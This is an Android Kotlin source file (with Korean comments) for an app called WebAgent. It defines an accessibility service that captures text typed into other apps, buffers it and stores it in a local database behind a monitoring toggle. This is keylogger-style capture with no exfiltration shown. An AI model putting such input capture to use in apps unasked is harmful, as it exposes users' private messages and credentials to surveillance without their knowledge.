package com.webagent.app.service

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.webagent.app.WebAgentApplication
import com.webagent.app.data.EventData
import com.webagent.app.data.EventType
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class KeyboardInputService : AccessibilityService() {
    private lateinit var app: WebAgentApplication
    private var lastInputTime = 0L
    private val inputBuffer = StringBuilder()
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        app = applicationContext as WebAgentApplication
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!app.preferenceStore.enableKeyboardMonitoring) return
        if (event == null) return
        
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val currentTime = System.currentTimeMillis()
                val text = event.text?.joinToString("") ?: ""
                
                // 짧은 시간 내 입력은 버퍼에 저장
                if (currentTime - lastInputTime < 2000) {
                    inputBuffer.append(text)
                } else {
                    // 새로운 입력 세션 시작
                    if (inputBuffer.isNotEmpty()) {
                        saveInput(inputBuffer.toString())
                        inputBuffer.clear()
                    }
                    inputBuffer.append(text)
                }
                
                lastInputTime = currentTime
            }
        }
    }
    
    private fun saveInput(input: String) {
        if (input.isBlank() || input.length < 3) return // 너무 짧은 입력은 무시
        
        val scope = CoroutineScope(Dispatchers.IO)
        scope.launch {
            app.database.eventDao().insertEvent(
                EventData(
                    type = EventType.KEYBOARD_INPUT,
                    content = input.take(200), // 최대 200자만 저장
                    metadata = "{\"length\":${input.length}}"
                )
            )
        }
    }
    
    override fun onInterrupt() {
        // 서비스 중단 시 처리
    }
}
